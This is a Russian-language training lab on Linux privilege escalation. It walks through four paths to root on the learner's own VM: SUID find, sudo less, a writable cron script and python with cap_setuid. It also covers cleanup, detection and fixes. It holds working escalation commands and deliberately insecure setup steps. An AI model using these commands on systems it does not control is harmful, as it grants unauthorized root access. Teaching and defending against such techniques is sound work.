# 10.2 — Linux privesc

> **M10 · Этап 1 · 5 ч · 🟡 · артефакт:** `labs/m10-privesc/l02-linux-root/`

## Цель

Пройти три разных пути до root и понять, почему каждый работает.

## Результат

- Root через SUID.
- Root через `sudo` + GTFOBins.
- Root через cron.
- Понимание, какой путь самый «тихий».

## Теория

- SUID-бинарник запускается с euid владельца; если это root и бинарник позволяет shell — root.
- `sudo` с `NOPASSWD` на программу, у которой есть `!shell`/`:!`, даёт root.
- Cron-скрипт, writable пользователем, выполняется от root — классика.
- Capabilities (`cap_setuid`) дают точечные привилегии.
- GTFOBins — база «как превратить легитимную программу в shell».
- Kernel exploit — последний вариант: рискованно, может уронить систему.

## Лаборатория

### Подготовка (на своей ВМ, от root)

```bash
sudo useradd -m -s /bin/bash alice && echo 'alice:Passw0rd!' | sudo chpasswd

# 1) SUID
sudo cp /usr/bin/find /usr/local/bin/find-suid
sudo chmod u+s /usr/local/bin/find-suid

# 2) sudo less
echo 'alice ALL=(ALL) NOPASSWD: /usr/bin/less' | sudo tee /etc/sudoers.d/alice
sudo chmod 440 /etc/sudoers.d/alice

# 3) cron
sudo tee /opt/backup.sh >/dev/null <<'EOF'
#!/bin/bash
echo "backup $(date)" >> /var/log/backup.log
EOF
sudo chmod 777 /opt/backup.sh
echo '* * * * * root /opt/backup.sh' | sudo tee /etc/cron.d/backup

# 4) capabilities
sudo cp /usr/bin/python3 /usr/local/bin/pycap
sudo setcap cap_setuid+ep /usr/local/bin/pycap
```

Переключитесь на alice: `su - alice`.

### 1. SUID

```bash
find / -xdev -perm -4000 -type f 2>/dev/null
/usr/local/bin/find-suid . -exec /bin/bash -p \; -quit
id
```

Ожидаемо: `euid=0(root)`. Объясните, почему `-p` важен (bash сбрасывает привилегии без него).

### 2. sudo + less

```bash
sudo -l
sudo less /etc/hosts
```

Внутри `less`:

```
!sh
```

Ожидаемо: shell от root (`id` → `uid=0`). `less` запускает shell с теми же привилегиями.

### 3. Cron

```bash
cat /etc/cron.d/backup
ls -l /opt/backup.sh
cat > /opt/backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
EOF
```

Подождите минуту:

```bash
ls -l /tmp/rootbash
/tmp/rootbash -p -c 'id'
```

Ожидаемо: `euid=0(root)`.

### 4. Capabilities

```bash
getcap -r / 2>/dev/null
/usr/local/bin/pycap -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
```

Ожидаемо: root. `cap_setuid` позволяет менять UID на 0.

### 5. Убрать

```bash
sudo rm /usr/local/bin/find-suid /usr/local/bin/pycap /tmp/rootbash /etc/sudoers.d/alice /etc/cron.d/backup /opt/backup.sh
```

## Атака и защита

- **Атака:** GTFOBins, writable cron, SUID-копии, capabilities.
- **Детект:** SUID вне пакетов, изменения cron, `setuid(0)` в неожиданном процессе, аудит `execve`.
- **Фикс:** минимальные sudo-правила без shell, cron только root-writable, запрет SUID в `/home`, `nosuid` на разделах, AppArmor/SELinux.

## Самопроверка

- [ ] Почему `bash` без `-p` теряет euid?
- [ ] Что делает `!sh` в `less`?
- [ ] Почему writable cron-скрипт = root?
- [ ] Чем `cap_setuid` опаснее обычного SUID?

## Дальше

[10.3 — Windows enumeration](l03-windows-enum.md)
